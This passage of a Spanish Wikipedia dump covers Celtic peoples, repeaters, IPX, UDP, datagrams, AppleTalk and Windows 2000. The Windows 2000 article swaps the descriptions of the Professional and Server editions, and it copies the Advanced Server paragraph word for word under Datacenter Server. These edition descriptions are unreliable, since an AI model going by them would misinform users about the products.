Más tarde se estableció el culto de las grandes divinidades, más o menos común a toda la Galia, y que en la época galorromana se fueron identificando con las divinidades de Roma: Teutates, especie de Mercurio con algo de Júpiter y de Marte; Taranis, relacionado con el rayo, pero carente del poder supremo de Júpiter; Esus, dios de la guerra y del ganado, asimilado de Marte o de Silvano; Belenus, dios de las artes, relacionado con el sol y comparado con Apolo; Cernumnos, dios del sueño y de la muerte, como Plutón.

Junto a ellos figuraban diosas, como: Rosmerla, asociada a Teutates; Belisma, diosa de las artes del fuego, asimilada de Minerva; Epona, diosa de la abundancia agrícola, asimilada a Ceres. 

Los galos tuvieron también divinidades abstractas o genios de las ciudades.

Entre las prácticas de la creencia popular es famosa la recolección, de acuerdo con prescripciones fijas, del muérdago, al que se consideraba dotado de virtudes extraordinarias. Asimismo, el roble se consideraba un árbol sagrado.

El territorio peninsular sobre el que se asientan los recién llegados (preceltas) estaba habitado por pueblos preíberos (aparte de geográfico, íbero es un término cultural). Se discute mucho si se produjo un desplazamiento, una conquista, una alianza, asimilación, pacto o fusión entre celtas e íberos (de buen grado o como siervos). Las primeras referencias escritas sobre los celtíberos se deben a geógrafos e historiadores grecolatinos (Estrabón, Tito Livio, Plinio y otros), aunque su estudio, que arranca del siglo XV, no adquiere rango científico hasta los inicios del siglo XX (marqués de Cerralbo, Schulten, Taracena, Caro Baroja, etc.), cobrando renovado impulso en los últimos años. Pese a este excepcional acervo literario, aún hoy se discuten aspectos claves para su definición: los confines de su solar, su verdadera personalidad o su propia genealogía.

Los datos disponibles son contradictorios y las teorías de los autores difieren sobre el tema. Incluso podría darse una mezcla de todas las opciones posibles ya que las densidades de población y los recursos disponibles son muy especulativas. Las relaciones e influencias mutuas cambiaron con el paso del tiempo. Se atestigua una gran presencia precelta en zonas la Bética (actual Huelva, Sevilla) que se intentan explicar mediante la presencia de siervos, mercenarios o bolsas aisladas de colonos.

La cultura de los celtíberos hizo suya la herencia de los iberos, de quienes adoptaron el sistema de escritura. Tras la caída de Numancia en el 133 a. C., su territorio pasó a formar parte de la provincia romana Hispania Citerior. 

Existe también un buen número de monedas grabadas con el nombre celtíbero de la ciudad o de los habitantes de la ciudad en donde aquellas fueron acuñadas. Además, se han encontrado 20 teseras de hospitalidad grabadas, pequeñas placas de bronce utilizadas como símbolo de pacto entre dos partes, generalmente entre un individuo y una comunidad, con las que el portador podía solicitar hospitalidad a lo largo de sus viajes. La mayoría de estas inscripciones son muy breves, con la excepción de la tesera de Luzaga (24 palabras).

Los galos eran los pueblos que habitaron lo que hoy es Francia, Bélgica, el oeste de Suiza y las zonas de Holanda y Alemania al oeste del Rin, y una franja aún poco determinada de este último país, a la orilla derecha del río. Los gálatas eran un pueblo galo que emigró a Asia Menor y se estableció en la región llamada Galacia.

Los griegos los llamaron celtas mientras que los romanos los denominaron galos, y a su gran región, la Galia. Ya los mismos romanos habían notado esto, por lo que hacían una diferencia entre la Galia Cisalpina (de este lado de los Alpes) y la Galia Transalpina (del otro lado de los Alpes). A su vez, la Transalpina era dividida en cuatro que, según la época de Roma, llamaron Galia Bélgica (de celtas menos ortodoxos), la Galia Comata o Melenuna (la netamente celta o tradicional), la Galia Aquitania (con celtas de características diversas o poco definidas) y la Galia Luguria o Celtoligur, la primera en ser anexada a Roma como la Provintia.

Los helvecios era otro de los pueblos celtas, o probablemente una confederación de tribus celtas, que vivían en la zona comprendida entre el alto Rin, el Jura suizo, el lago de Ginebra y los Alpes. A fines del siglo II a. C. dominaban el territorio que se extendía desde el alto Rin y la Selva Negra hasta el Meno. Julio César describió su confrontación con los helvecios en su De Bello Gallico.

Al estar bajo presión de las tribus germánicas en su tierra natal, los helvecios cruzaron la Galia y buscaron una nueva patria al norte del río Garona, con la tribu entera bajo el mando Orgétorix. 

Julio César fue llamado por los galos de la provincia de la Galia Narbonense, que habían sido conquistados y organizados para defenderse de los helvecios.

Julio César entonces mandó seis legiones que comprendían casi 29 000 hombres. Los helvecios, de acuerdo con Julio César, tenían cerca de 370 000 personas (incluyendo mujeres y niños), pero sólo 110 000 hombres capaces de luchar. Julio César rápidamente reclutó dos legiones más descansadas.
Cuando la tribu inició su marcha, Orgétorix había muerto. Antes de la partida, los helvecios quemaron sus villas y destruyeron las plantaciones y otras mercancías que no podían llevar, para forzarse a no retroceder.

Atraídos por una posición desvantajosa con los romanos ocupando el terreno elevado próximo a Bibracte, los helvecios fueron atacados por las fuerzas superiores romanas, que consiguieron matar aproximadamente un 60 % de la tribu y capturar a otro 20 % como esclavos. Lo que quedó de los helvecios fue empujado de vuelta a sus antiguas tierras de Helvecia.
En el 52 a. C., 10 000 helvecios se juntaron a las fuerzas de Vercingétorix en su tentativa de liberar la Galia de los romanos. Vivían en castros (viviendas circulares hechas con piedras)

Los britanos o britones fueron los pueblos indígenas que habitaron la isla de Gran Bretaña (Albión), los cuales podían ser descritos como celtas insulares" antes de que su lengua y culturas fueran reemplazadas por las de los invasores anglosajones.

Estos pueblos hablaban lenguas britónicas y compartían tradiciones culturales comunes. En términos de lengua y cultura, gran parte de todo el oeste de Europa fue principalmente céltica durante este periodo, aunque la isla de Gran Bretaña y la Bretaña continental estuvieron habitadas por celtas britanos. Los habitantes de Irlanda, la Isla de Man y Dalriada eran escotos o celtas gaélicos, hablantes de lenguas goidélicas.

Parte de los eruditos en la materia argumentan que el desconocido idioma picto era de origen britano, si bien en la Britania prerromana los pictos se distinguían como un grupo separado, del mismo modo que los escotos de Dalriada. En cualquier caso, el término "britano" se refiere tradicionalmente a los habitantes de la antigua Britania excluyendo a los pictos, ya que muchos de los rasgos culturales pictos (como por ejemplo, su escultura, alfarería y monumentos) diferían de los de los britanos.





</doc>
<doc id="6428" url="https://es.wikipedia.org/wiki?curid=6428" title="Repetidor">
Repetidor

En telecomunicaciones, el término repetidor tiene los siguientes significados normalizados:

En el caso de las señales digitales el repetidor se suele denominar regenerador porque, de hecho, la señal de salida es una “señal regenerada” a partir de la de entrada.

En el modelo de referencia OSI, el repetidor opera en el nivel físico.

Los repetidores se utilizan a menudo en los cables transcontinentales y transoceánicos porque la atenuación (pérdida de señal) en tales distancias sería completamente inaceptable sin ellos. Los repetidores se utilizan tanto en cables de cobre portadores de señales eléctricas como en cables de fibra óptica portadores de luz.

Los repetidores se utilizan también en los servicios de radiocomunicación. Un subgrupo de estos son los repetidores usados por los radioaficionados.

Asimismo, se utilizan repetidores en los enlaces de telecomunicación punto a punto mediante radioenlaces que funcionan en el rango de las microondas, como los utilizados para distribuir las señales de televisión entre los centros de producción y los distintos emisores o los utilizados en redes de telecomunicación para la transmisión de telefonía.

Los repetidores telefónicos consisten en un receptor (auricular) acoplado mecánicamente a un micrófono de carbón, fueron utilizados antes de la invención de los amplificadores electrónicos dotados de tubos de vacío.

En comunicaciones ópticas el término repetidor se utiliza para describir un elemento del equipo que recibe una señal óptica, la convierte en eléctrica, la regenera y la retransmite de nuevo como señal óptica. Dado que estos dispositivos convierten la señal óptica en eléctrica y nuevamente en óptica.

Un repetidor wifi o también llamado amplificador wifi cumple con las características de funcionalidad de un repetidor por lo que recoge la señal que recibe y la amplifica con el fin de ampliar el rango de la señal.

La peculiaridad de estos dispositivos es que están destinados a propagar la señal wifi recibida por parte de un emisor, habitualmente suele ser un router wireless.

Su uso se extiende tanto en espacios abiertos como cerrados, como puede ser dentro del hogar o unas oficinas.

De este modo dentro del ámbito de los espacios cerrados se ocupa de recibir la señal que emite el router y la propaga con el fin de cubrir las áreas donde la señal no llega.

Para que cumpla con dicha funcionalidad, el repetidor wifi debe estar dentro del rango de la señal emitida por el router para poder recibirla y replicarla.

El proceso de instalación es bastante sencillo y se simplifica conectando el amplificador en un enchufe para posteriormente realizar la sincronización. Normalmente este proceso se realiza de forma automática, aunque en ocasiones puede precisar de configuraciones adicionales.

El uso de estos dispositivos está muy extendido ya que al ampliar el rango de la señal wifi permite la conexión a Internet desde cualquier parte del espacio cerrado con los dispositivos móviles que actualmente empleamos, como pueden ser teléfonos inteligentes, tabletas, etc.


</doc>
<doc id="6430" url="https://es.wikipedia.org/wiki?curid=6430" title="Internetwork Packet Exchange">
Internetwork Packet Exchange

Internetwork Packet Exchange o IPX (en español "intercambio de paquetes interred") es un antiguo protocolo de comunicaciones de redes NetWare (del fabricante Novell) utilizado para transferir datos de un nodo a otro de la red mediante paquetes de datos llamados datagramas.

Los paquetes en IPX incluyen direcciones de redes, permitiendo enviar datos de una red a otra y, en consecuencia, interconectar ordenadores de redes diferentes. Algún paquete en IPX puede perderse cuando cruza redes, por lo que IPX no garantiza la entrega de un mensaje completo. La aplicación tiene que proveer ese control o utilizar el protocolo SPX de Novell. IPX provee servicios en los estratos 3 y 4 del modelo OSI (capas de red y de transporte respectivamente).

Este protocolo tuvo mucha popularidad al inicio del auge histórico de los videojuegos multijugador en red en la década de 1990, por ser el primero que permitía interconectar redes de diferentes usuarios domésticos, siendo la única posibilidad de comunicación por la que apostaron muchos desarrolladores ya que las tarjetas de red fabricadas por Novell eran las primeras al alcance del público individual.

Actualmente, el protocolo está obsoleto y si pervive es de forma residual, precisamente gracias a videojuegos antiguos que no conservan otros modelos de comunicación vigente disponible.




</doc>
<doc id="6431" url="https://es.wikipedia.org/wiki?curid=6431" title="Protocolo de datagramas de usuario">
Protocolo de datagramas de usuario

El protocolo de datagramas de usuario (en inglés: User Datagram Protocol o UDP) es un protocolo del nivel de transporte basado en el intercambio de datagramas (Encapsulado de capa 4 o de Transporte del Modelo OSI). Permite el envío de datagramas a través de la red sin que se haya establecido previamente una conexión, ya que el propio datagrama incorpora suficiente información de direccionamiento en su cabecera. Tampoco tiene confirmación ni control de flujo, por lo que los paquetes pueden adelantarse unos a otros; y tampoco se sabe si ha llegado correctamente, ya que no hay confirmación de entrega o recepción.
Su uso principal es para protocolos como DHCP, BOOTP, DNS y demás protocolos en los que el intercambio de paquetes de la conexión/desconexión son mayores, o no son rentables con respecto a la información transmitida, así como para la transmisión de audio y vídeo en real, donde no es posible realizar retransmisiones por los estrictos requisitos de retardo que se tiene en estos casos.

User Datagram Protocol (UDP) es un protocolo mínimo de nivel de transporte orientado a mensajes documentado en el RFC 768 de la IETF.

En la familia de protocolos de Internet UDP proporciona una sencilla interfaz entre la capa de red y la capa de aplicación. UDP no otorga garantías para la entrega de sus mensajes (por lo que realmente no se debería encontrar en la capa 4) y el origen UDP no retiene estados de los mensajes UDP que han sido enviados a la red. UDP sólo añade multiplexado de aplicación y suma de verificación de la cabecera y la carga útil. Cualquier tipo de garantías para la transmisión de la información deben ser implementadas en capas superiores.

La cabecera UDP consta de 4 campos de los cuales 2 son opcionales (con fondo rojo en la tabla). Los campos de los puertos origen y destino son campos de 16 bits que identifican el proceso de emisión y recepción. Ya que UDP carece de un servidor de estado y el origen UDP no solicita respuestas, el puerto origen es opcional. En caso de no ser utilizado, el puerto origen debe ser puesto a cero. A los campos del puerto destino le sigue un campo obligatorio que indica el tamaño en bytes del datagrama UDP incluidos los datos. El valor mínimo es de 8 bytes. El campo de la cabecera restante es una suma de comprobación de 16 bits que abarca una pseudo-cabecera IP (con las IP origen y destino, el protocolo y la longitud del paquete UDP), la cabecera UDP, los datos y 0's hasta completar un múltiplo de 16. El checksum también es opcional en IPv4, aunque generalmente se utiliza en la práctica (en IPv6 su uso es obligatorio). A continuación se muestra los campos para el cálculo del checksum en IPv4, marcada en rojo la pseudo-cabecera IP.

El protocolo UDP se utiliza por ejemplo cuando se necesita transmitir voz o vídeo y resulta más importante transmitir con velocidad que garantizar el hecho de que lleguen absolutamente todos los bytes.

UDP utiliza puertos para permitir la comunicación entre aplicaciones. El campo de puerto tiene una longitud de 16 bits, por lo que el rango de valores válidos va de 0 a 65.535. El puerto 0 está reservado, pero es un valor permitido como puerto origen si el proceso emisor no espera recibir mensajes como respuesta.

Los puertos 1 a 1023 se llaman puertos "bien conocidos" y en sistemas operativos tipo Unix enlazar con uno de estos puertos requiere acceso como superusuario.

Los puertos 1024 a 49.151 son puertos registrados.

Los puertos 49.152 a 65.535 son puertos dinámicos y son utilizados como puertos temporales, sobre todo por los clientes al comunicarse con los servidores.

La mayoría de las aplicaciones claves de Internet utilizan el protocolo UDP, incluyendo: el Sistema de Nombres de Dominio , donde las consultas deben ser rápidas y solo contaran de una sola solicitud, luego de un paquete único de respuesta, el Protocolo de Administración de Red, el Protocolo de Información de Enrutamiento (RIP) y el Protocolo de Configuración dinámica de host.

Las características principales de este protocolo son:

1. Trabaja sin conexión, es decir que no emplea ninguna sincronización entre el origen y el destino. 

2. Trabaja con paquetes o datagramas enteros, no con bytes individuales como TCP. Una aplicación que emplea el protocolo UDP intercambia información en forma de bloques de bytes, de forma que por cada bloque de bytes enviado de la capa de aplicación a la capa de transporte, se envía un paquete UDP.

3. No es fiable. No emplea control del flujo ni ordena los paquetes.

4. Su gran ventaja es que provoca poca carga adicional en la red ya que es sencillo y emplea cabeceras muy simples.

El siguiente ejemplo muestra cómo usar el protocolo UDP para una comunicación cliente/servidor:
Servidor:

Cliente:

El siguiente ejemplo muestra cómo usar el protocolo UDP para una comunicación cliente/servidor:
Servidor:

Cliente (Cambia ""localhost"" por la dirección IP del servidor.):

El siguiente ejemplo muestra cómo usar el protocolo UDP para una comunicación cliente/servidor:
Servidor:

Cliente (Cambia "127.0.0.1" por la dirección IP del servidor):

El siguiente ejemplo muestra cómo usar el protocolo UDP para una comunicación cliente/servidor:

Servidor:

Cliente:



UDP es generalmente el protocolo usado en la transmisión de vídeo y voz a través de una red. Esto es porque no hay tiempo para enviar de nuevo paquetes perdidos cuando se está escuchando a alguien o viendo un vídeo en tiempo real. 

Ya que tanto TCP como UDP circulan por la misma red, en muchos casos ocurre que el aumento del tráfico UDP daña el correcto funcionamiento de las aplicaciones TCP. Por defecto, TCP pasa a un segundo lugar para dejar a los datos en tiempo real usar la mayor parte del ancho de banda. El problema es que ambos son importantes para la mayor parte de las aplicaciones, por lo que encontrar el equilibrio entre ambos es crucial.

Todo este tipo de protocolos son usados en telemática.



</doc>
<doc id="6432" url="https://es.wikipedia.org/wiki?curid=6432" title="Datagrama">
Datagrama

Un datagrama es un paquete de datos que constituye el mínimo bloque de información en una red de conmutación por datagramas, la cual es uno de los dos tipos de protocolo de comunicación por conmutación de paquetes usados para encaminar por rutas diversas dichas unidades de información entre nodos de una red, por lo que se dice que no está orientado a conexión. La alternativa a esta conmutación de paquetes es el circuito virtual, orientado a conexión.

Los datagramas se componen de:

En la técnica de datagramas, cada paquete se trata de forma independiente gracias a que puede contener en la cabecera la dirección de origen y destinatario. Mediante un encaminador, también conocido como enrutador o, más popularmente, "router", la red puede encaminar cada fragmento hacia el receptor o ETD (Equipo Terminal de Datos) por rutas diferentes.

Este funcionamiento es la diferencia esencial con la conmutación por circuito virtual y determina sus virtudes y defectos, que también condicionan su idoneidad al tipo de aplicación de la red.

Esta flexibilidad permite:

Sin embargo, esta técnica también impide garantizar:
Por todo ello, depende de nuevos procedimientos para reconstruir la información adecuadamente en el destino. Además, aumenta el volumen de tráfico un poco, al repetirse información de cabecera como la dirección a cada trama.

Como internet es una red de conmutación de paquetes, tiene protocolos:

Los datagramas tienen cabida en los servicios de red no orientados a la conexión. Los datagramas IP son las unidades principales de información de Internet. Los términos trama, mensaje, paquete de red y segmento también se usan para describir las agrupaciones de información lógica en las diversas capas del modelo de referencia OSI y en los diversos círculos tecnológicos.




</doc>
<doc id="6433" url="https://es.wikipedia.org/wiki?curid=6433" title="AppleTalk">
AppleTalk

Appletalk es un conjunto de protocolos desarrollados por Apple Inc. para la interconexión de redes locales. Fue incluido en un Macintosh Apple en 1984 y actualmente está en desuso en los Macintosh en favor de las redes TCP/IP.

1984 - Desarrollo e inclusión en un Macintosh

1985 - En ese tiempo solo se compartían impresoras utilizando el concepto del Selector o Chooser.

1986 - Se introducen los encaminadores, su función es la de separar redes en pequeñas porciones para evitar la saturación y el tráfico.

1987 - Se introduce EtherTalk y un servidor de archivos. Hasta este año se comparten archivos y se tiene un servidor como tal. 

1988 - Se introducen VAXes y PC's a la red. En este momento se dan las primeras conexiones de Macintosh con otros ambientes. 

1989 - Ya se tienen miles de nodos EtherTalk. Se introducen las primeras interconexiones a redes de Internet.

Podemos dividir Appletalk en dos fases en cuanto a sus características:

Fase 1 (1985):


Fase 2 (1989):


Disponible para la mayoría de:

El diseño de Appletalk se basa en el modelo OSI pero a diferencia de otros de los sistemas LAN no fue construido bajo el sistema Xerox XNS, no tenía Ethernet y tampoco tenía direcciones de 48 bit para el encaminamiento.

En este protocólo se incluyeron una serie de características que permitieron que las redes locales se conectasen sin configuración previa o necesidad de un router o servidor.
Appletalk está equipado para asignar direcciones y configurar cualquier enrutamiento de manera automática.

Protocolos de Appletalk en el modelo OSI

Nivel 1:




Nivel 2:

Nivel 3:

Nivel 4:




Nivel 5:



Nivel 6 y 7:



El hardware inicial por defecto para Appletalk era un protocolo de alta velocidad conocido como LocalTalk que utilizaba los puertos RS-422 del Macintosh a 230,4 kbit/s. LocalTalk dividía el puerto RS-422 para proporcionar un cable de subida y de bajada en un solo puerto.
El sistema sería lento actualmente, pero gracias a su relación coste/complejidad los Macs solían ser las únicas máquinas en red de muchos negocios.

Un sustituto común para LocalTalk era PhoneNet, una solución alternativa (de una compañía llamada Farallon) que también utilizó el puerto RS-422 y era menos costoso de instalar y mantener. Ethernet y el token ring también fueron usados, conocido como EtherTalk y TokenTalk respectivamente. EtherTalk se convirtió gradualmente en el método dominante para Appletalk mientras que Ethernet se popularizó en la industria del PC a través de los años 90.




</doc>
<doc id="6437" url="https://es.wikipedia.org/wiki?curid=6437" title="Windows 2000">
Windows 2000

Windows 2000 es un sistema operativo de Microsoft que se puso en circulación el 17 de febrero de 2000 con un cambio de nomenclatura para su sistema NT. Así, Windows NT 5.0 pasó a llamarse Windows 2000. Fue sucedido por Windows XP para equipos de escritorio en octubre de 2001 y Windows Server 2003 para servidores en abril de 2003. Su creación representó un esfuerzo por la unificación de hasta ese momento dos sistemas operativos distintos, Windows 9x y Windows NT. Dos años antes de su salida se sabía que Windows NT 5.0 estaba en proyecto, pero Windows 2000 llegó a resolver de una vez por todas las dudas.

Windows 2000 era un sistema operativo para empresas y para ejecutar servidores de red o los servidores de archivo. Dentro de las tareas que puede realizar se incluyen: crear cuentas de usuarios, asignar recursos y privilegios, actuar como servidor web, FTP, servidor de impresión, DNS o resolución de nombres de dominio, servidor DHCP, entre otros servicios básicos. Otra de las funciones que tiene, es como en todo sistema Windows la opción de utilizarlo como una estación de trabajo más de la red. Dicho sistema operativo es muy eficiente y su principal punto fuerte es el Active Directory (Directorio Activo), herramienta desde la cual se puede administrar toda la infraestructura de una organización.

En este sistema operativo, se introdujeron algunas modificaciones respecto a sus predecesores como el sistema de archivos NTFS 5, con la capacidad de cifrar y comprimir archivos. Introdujo también las mejoras en el sistema de componentes COM, introduciendo COM+ que unificó en un solo paquete de los servicios anexados y la tecnología COM y MTS de Windows NT4, con nuevas ventajas en el ámbito empresarial.

Windows 2000 es la continuación de la familia de sistemas operativos de Microsoft, que sustituye a Windows NT 4.0. Originalmente fue llamado Windows NT 5.0, pero Microsoft cambió el nombre a "Windows 2000" el 27 de octubre de 1998. 

Aunque el nombre en clave de Windows 2000 Service Pack 1 iba a ser "Asteroid" y el de Windows 2000 64-bit iba a ser "Janus" (no debe confundirse con Windows 3.1, que tenía el mismo nombre en clave), esta es la primera versión de Windows que no tiene nombres en clave. La primera versión beta de Windows 2000 se publicó en septiembre de 1997 y varias betas fueron producidas hasta llegar a la Beta 3, que fue lanzada el 29 de abril de 1999.
Durante el desarrollo de Windows 2000 hubo un DEC Alpha, una Beta que fue abandonada luego y se produjo la beta RC1, luego que Compaq anunció que no apoyaba más a Microsoft en la construcción de Windows 2000. 

Desde entonces, Microsoft publicó tres candidatos entre julio y noviembre de 1999, y finalmente se liberó el sistema operativo a las empresas el 12 de diciembre de 1999. 

El público en general pudo empezar a comprar la versión completa de Windows 2000 el 17 de febrero de 2000, el último sistema para PC-9821 en Japón meses antes de su descatalogo. 

Tres días antes de este evento, Microsoft anunció "un nivel alto de fiabilidad" en su sistema operativo, pero en un memorándum filtrado desde Microsoft, Mary Jo Foley reveló que Windows 2000 tenía "más de 63.000 defectos potenciales conocidos". Después de la publicación del artículo de Foley, Microsoft tuvo a Foley en la lista negra por un tiempo considerable.

Microsoft anunció en su boletín semanal que "Nuestras pruebas demuestran que el sucesor de NT 4.0 es todo lo que esperábamos que sería. Por supuesto, tampoco es perfecto.” Wired News describió como "mediocre" al sistema operativo luego de que fuera puesto en marcha en el mes de febrero. 
Novell criticó el Active Directory de Microsoft, la nueva arquitectura de servicios de directorio, como menos escalable y fiable que su propia Novell Directory Services (NDS). 

Con Windows 2000 Microsoft preveía sustituir Windows 98 y Windows NT 4.0. Sin embargo, eso cambió después, ya que una versión actualizada de Windows 98 llamada Windows 98 Second Edition fue lanzada en 1999 y Windows Me fue lanzado a finales de 2000. Cerca del lanzamiento de Windows 2000 Service Pack 1, Microsoft lanzó Windows 2000 Datacenter Server, dirigidas a grandes sistemas de computación y con soporte para 32 procesadores, el 29 de septiembre de 2000. 

Poco antes del 12 de febrero de 2004, Microsoft anunció que "partes del código fuente de Microsoft Windows 2000 y Windows NT 4.0 están ilegalmente disponibles en internet". El origen de la fuga no fue reportado. Microsoft publicó la siguiente declaración: 

""El Código fuente de Microsoft contiene derechos de autor y está protegido como secreto comercial. Como tal, es ilegal ponerla a disposición de otros usuarios, descargarlo o usarlo"." 

A pesar de las advertencias, el archivo que contiene el código fue difundido ampliamente en internet. El 16 de febrero de 2004, se descubrió un exploit que fue "supuestamente descubierto por un particular estudio del código fuente" en ciertas versiones de Microsoft Internet Explorer se informó.

Existen cuatro variantes de Windows 2000 que son: Professional, Server , Advanced Server y Datacenter Server. Estas dos últimas variantes son ampliaciones del propio Windows 2000 Server.

Windows 2000 Profesional, Era destinada a ser el servidor de archivos, impresión, web, FTP de una pequeña o mediana empresa. Su antecesor es Windows NT 4.0 Server. Es ideal para cuando no se requiere de un servidor dedicado a cada tarea o departamento, logrando de esta manera mantener todo centralizado en un solo servidor. Soporta hasta 4 procesadores.

Windows 2000 Server sucesor de NT Workstation, estaba destinado a ser un cliente de red seguro y una estación de trabajo corporativa. Soporta hasta 2 procesadores y es útil, como sistema operativo autónomo, para correr aplicaciones de alta performance, especialmente en diseño gráfico, por ejemplo. Microsoft lo promocionaba como el principal sistema operativo de escritorio en un entorno de negocios. Aunque ya está descatalogado se sigue utilizando en infinidad de aplicaciones corporativas por su robustez y fiabilidad sobre todo en lo que a software industrial se refiere. A día de hoy sigue funcionando en cientos de miles de empresas de todo el mundo como principal plataforma de producción enlazado con todo tipo de sistemas automáticos de control gracias a su enorme fiabilidad.

Windows 2000 Advanced Server fue el sucesor de Windows NT Server 4.0 Enterprise. Este sistema está orientado a empresas de medianas a grandes que ya tienen una mayor demanda por parte de los clientes (es decir, los usuarios de la red) para ejecutar aplicaciones de negocios en línea como soluciones en comercio electrónico y punto.com. Ofrece una estructura completa de clústeres para alta disponibilidad y escalabilidad y admite el multiprocesamiento simétrico de ocho vías (SMP), además de memoria hasta de 8 GB con la Extensión de dirección física 
de Intel (PAE). Soporta hasta 8 procesadores, soporte RAID y tolerancia a fallas. Su principal función es la de servidor de aplicaciones o de tareas crítica dentro de una organización grande. En general en estos casos, la demanda no es toda de un servidor sino de varios.

Windows 2000 Datacenter Server fue el sucesor de Windows NT Server 4.0 Enterprise. Este sistema está orientado a empresas de medianas a grandes que ya tienen una mayor demanda por parte de los clientes (es decir, los usuarios de la red) para ejecutar aplicaciones de negocios en línea como soluciones en comercio electrónico y punto.com. Ofrece una estructura completa de clústeres para alta disponibilidad y escalabilidad y admite el multiprocesamiento simétrico de ocho vías (SMP), además de memoria hasta de 8 GB con la Extensión de dirección física 
de Intel (PAE). Soporta hasta 8 procesadores, soporte RAID y tolerancia a fallas. Su principal función es la de servidor de aplicaciones o de tareas crítica dentro de una organización grande. En general en estos casos, la demanda no es toda de un servidor sino de varios.

Windows 2000 Advanced Server Limited Edition es una versión limitada de Windows 2000 Advanced Server.

Esta versión se basa en el mismo desarrollo de código 64 bits que se incluirá en la familia "Windows .NET Server" y que se haya optimizado para sacar el máximo provecho de las mejoras de rendimiento que incorpora el nuevo procesador Intel Itanium 2.

Windows Advanced Server Limited Edition 1.2 es un sistema operativo con todas las características y soporte completo para 64 bits , lo que le convierte en idóneo en aplicaciones intensivas de memoria y computación, tales como análisis de grandes bases de datos, procesos de transacciones online, business intelligence, computación científica y modelos de simulación.

En este sistema operativo se pueden encontrar grandes mejoras respecto a su versión anterior, entre estas se encuentran: abundancia de herramientas de conectividad, madurez de la interfaz, buen reconocimiento del hardware y estabilidad. Se añade a esto el soporte de nuevas tecnologías, las mejoras en sus funciones de informática remota, aplicaciones centralizadas de servicio y reinicios obligatorios drásticamente reducidos. Muchas de las mejoras en Windows 2000 son sutiles, pero en conjunto crean una mejor experiencia en el uso de un ordenador. Lo cierto es que después de trabajar unas semanas con Windows 2000, no se echa de menos Windows 98. 

No hay que ser modesto con Windows 2000. Los requerimientos mínimos recomendados para Windows 2000 Professional son, un Pentium 166 MHz , 64 Mb de RAM (Aunque puede instalarse en un 486) y 2Gb de disco duro, con espacio libre de al menos 1 Gb. Esto son números para que el sistema W2000 Professional pueda funcionar. Las versiones Server y Advanced Server requieren procesadores más potentes y más RAM (al menos 256 Mb). En resumen, se recomienda que si deseas instalar W2000 y obtener un nivel aceptable de rendimiento (sobre todo para las versiones Server) optes por una máquina Pentium III 500 Mhz con 256 Mb de RAM como mínimo.

La instalación de Windows 2000 Pro puede realizarse sobre Windows 98, aunque las versiones Server y Advanced Server requieren NT o una instalación limpia. El proceso empieza simplemente ejecutando el archivo Setup. Tras unos breves cuadros de opciones para la selección del lenguaje y de accesibilidad, se procede a la copia de archivos de instalación en el disco duro. Previamente, el asistente advertirá si uno desea convertir el sistema de archivos FAT o FAT32 a NTFS. Se recomienda hacerlo, ya que este sistema permite utilizar más eficientemente las funciones de administración de archivos. Una vez terminado, el sistema se reinicia automáticamente y empieza la instalación. El proceso de instalación es largo, pero no necesita demasiada atención y es capaz de aplicar el reconocimiento plug-and-play de forma óptima. 

La versión comercial de Windows 2000 es capaz de reconocer y dar soporte a multitud de dispositivos, asignando de forma automática los recursos e instalan-do los controladores. El nuevo Asistente para la instalación de hardware permite añadir, configurar, quitar, resolver conflictos y actualizar los periféricos de forma dinámica sin preocuparse sobre los efectos en el resto del sistema. De cualquier forma, aunque el soporte de hardware con BIOs antiguas está contemplado, las ventajas mayores se conseguirán sin duda con hardware nuevo, bien USB, AGP OpenGL 1.2 o DirectX. 

El reconociendo del hardware es la parte más larga de la instalación. Una vez terminada la copia de archivos y controladores, el sistema se reiniciará y entremos en la fase de configuración, creación, creación de accesos y registro de componentes. La primera vez que se arranca Widows 2000 notaremos que demora algo más que W98. En la versión Server y superiores, el administrador de red tiene la opción de realizar la instalación de W2000 de forma remota sobre las máquinas cliente.

En lo que se refiere a soporte de hardware, las dos tecnologías que componen los cimientos de Windows 2000 son Plug and Play y ACPI (Advanced Configuration and Power Inteface), ambas en la base del soporte de hardware de Windows 98. En términos de Microsoft, el conjunto de ACPI y Plug and Play se conocen como la Iniciativa OnNow. 

Esta iniciativa de diseño hace que las computadoras estén inmediatamente disponibles. En otras palabras, sin OnNow, las PC's bootean cuando se las enciende. Con OnNow, éstas pasan de un estado de bajo consumo de energía directamente al estado de funcionamiento, y viceversa. Cuando una computadora no está en uso, permanece en un estado en el que parece apagada; sin embargo, todavía esta en condiciones de reaccionar a los eventos que se puedan producir en su entorno. En términos comunes, OnNow permite la suspensión y la hibernación. En este último caso, el sistema operativo vuelca en un archivo del disco rígido el contenido de la memoria y se apaga. Al reiniciarse, vuelve a invocar el archivo de la memoria y el Escritorio aparece exactamente igual que antes de apagarse. 

Windows asume el control de la configuración del sistema y de la administración de la energía a través de los BIOS Plug and Play y APM (Advanced Power Management). Para esto usa un modelo unificado de controladores unificado porque sirven tanto para Windows 98 como para 2000- llamado Windows Driver Model (WDM), que soporta Plug and Play y administración de energía para el dispositivo que controla.

Nuevos iconos de sistema y una visualización aparentemente más tridimensional es lo primero que llama la atención. Sobresale, por ejemplo, la posibilidad de que el puntero del mouse aparezca con una sombra por detrás, que se destaca del fondo. 

Novedades respecto a la interfaz. 

Las sorpresas de Windows 2000 empiezan con el menú Inicio. Se diferencia en algo fundamental con relación a versiones anteriores: es capaz de hacer seguimiento de los programas y archivos que se utilizan durante las primeras sesiones. El sistema utiliza este perfil de comportamiento para configurar el menú Programas, de forma que siempre aparezcan las aplicaciones más utilizadas en primer plano, mientras que las restantes se encuentran “recogidas” en el menú. Esto no sólo facilita el acceso a los programas, sino que da una mayor limpieza visual en pantalla. Además, es posible poner en cascada el panel de control y activar el despliegue suave de los menús, con un efecto fade tranquilizador. 

Entre los detalles más interesantes de W2000 destaca la nueva estructura de los cuadros de diálogo Abrir, Imprimir o Guardar. Estos cuadros presentan un diseño tipo Outlook que permite el acceso rápido a los archivos más utilizados. Además de la carpeta Mis Documentos, tenemos al alcance otras denominadas Mis Imágenes (donde se guardan por defecto los archivos gráficos) y Mis Sitios (donde se han centralizado todos los recursos de red). La barra de navegación de los cuadros de diálogo incluye también una lista de los documentos utilizados recientemente.

